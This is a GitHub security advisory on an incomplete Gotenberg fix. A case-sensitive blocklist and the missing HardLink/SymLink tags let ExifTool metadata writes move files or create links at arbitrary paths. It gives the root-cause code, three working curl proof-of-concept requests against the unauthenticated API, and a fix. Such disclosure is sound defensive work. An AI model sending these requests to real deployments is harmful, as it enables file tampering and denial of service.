# [H] Gotenberg has incomplete fix for ExifTool arbitrary file write: case-insensitive bypass and missing HardLink/SymLink tags

## Summary
Severity: High
Advisory: GHSA-qmwh-9m9c-h36m
CWE: CWE-178, CWE-73
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-04-07
Source: https://github.com/advisories/GHSA-qmwh-9m9c-h36m
Type: github-advisory

## Affected
- Go: `github.com/gotenberg/gotenberg/v8` — affected >=0 <8.30.0

## Details
## Summary

The fix for ExifTool arbitrary file write (commit `043b158`, released in v8.29.0) uses a case-sensitive blocklist to filter dangerous pseudo-tags. ExifTool processes tag names case-insensitively, so alternate casings bypass the filter. The blocklist also omits the `HardLink` and `SymLink` pseudo-tags entirely.

Confirmed end-to-end against Gotenberg v8.29.1 via the unauthenticated HTTP API.

## Root Cause

`pkg/modules/exiftool/exiftool.go` lines 231-237:

    dangerousTags := []string{
        "FileName",  // Writing this triggers a file rename in ExifTool
        "Directory", // Writing this triggers a file move in ExifTool
    }
    for _, tag := range dangerousTags {
        delete(metadata, tag)
    }

Go's `delete(metadata, tag)` is case-sensitive. It only removes the exact keys `"FileName"` and `"Directory"`. ExifTool processes tag names case-insensitively (per ExifTool documentation). Alternate casings like `filename`, `FILENAME`, `directory` all bypass the Go blocklist but ExifTool treats them identically.

The go-exiftool library passes tag names directly to ExifTool's stdin at line 258:

    fmt.Fprintln(e.stdin, "-"+k+"="+str)

So `filename` becomes `-filename=/attacker/path` which ExifTool interprets as `-FileName=/attacker/path`.

The blocklist also omits two dangerous ExifTool pseudo-tags:
- `HardLink`: creates a hard link to the file at the specified path
- `SymLink`: creates a symbolic link to the file at the specified path

## PoC

All three vectors confirmed against a running Gotenberg v8.29.1 Docker container.

**Case-insensitive filename bypass (file moved to /tmp/evil_bypass.pdf):**

    curl -X POST http://localhost:3000/forms/pdfengines/metadata/write \
      -F files=@sample.pdf \
      -F 'metadata={"filename": "/tmp/evil_bypass.pdf"}'

**HardLink (hard link created at /tmp/hardlink_bypass.pdf):**

    curl -X POST http://localhost:3000/forms/pdfengines/metadata/write \
      -F files=@sample.pdf \
      -F 'metadata={"HardLink": "/tmp/hardlink_bypass.pdf"}'

**SymLink (symbolic link created at /tmp/symlink_bypass.pdf):**

    curl -X POST http://localhost:3000/forms/pdfengines/metadata/write \
      -F files=@sample.pdf \
      -F 'metadata={"SymLink": "/tmp/symlink_bypass.pdf"}'

Verification inside the container:

    $ docker exec gotenberg-poc ls -la /tmp/evil_bypass.pdf /tmp/hardlink_bypass.pdf /tmp/symlink_bypass.pdf
    -rw-r--r-- 1 gotenberg gotenberg 321 ... /tmp/evil_bypass.pdf
    -rw-r--r-- 1 gotenberg gotenberg 321 ... /tmp/hardlink_bypass.pdf
    lrwxrwxrwx 1 gotenberg gotenberg 119 ... /tmp/symlink_bypass.pdf -> /tmp/.../source.pdf

Also confirmed ExifTool case-insensitivity directly:

    exiftool -filename=bypassed.pdf test.pdf  # Works identically to -FileName=

## Impact

An attacker with access to the Gotenberg API (unauthenticated by default) can:

1. Rename/move uploaded PDFs to arbitrary filesystem paths via lowercase `filename`/`directory`
2. Create hard links at arbitrary paths via `HardLink`, persisting data beyond temp directory cleanup
3. Create symbolic links at arbitrary paths via `SymLink`

In containerized deployments, impact is limited to the container filesystem (DoS by overwriting temp files). In bare-metal deployments or those with shared volumes, this can affect other services.

## Suggested Fix

Use case-insensitive comparison and expand the blocklist:

    dangerousTags := []string{
        "FileName",
        "Directory",
        "HardLink",
        "SymLink",
    }
    for key := range metadata {
        for _, tag := range dangerousTags {
            if strings.EqualFold(key, tag) {
                delete(metadata, key)
            }
        }
    }

## References
- https://github.com/gotenberg/gotenberg/security/advisories/GHSA-qmwh-9m9c-h36m
- https://github.com/gotenberg/gotenberg/commit/15050a311b73d76d8b9223bafe7fa7ba71240011
- https://github.com/gotenberg/gotenberg
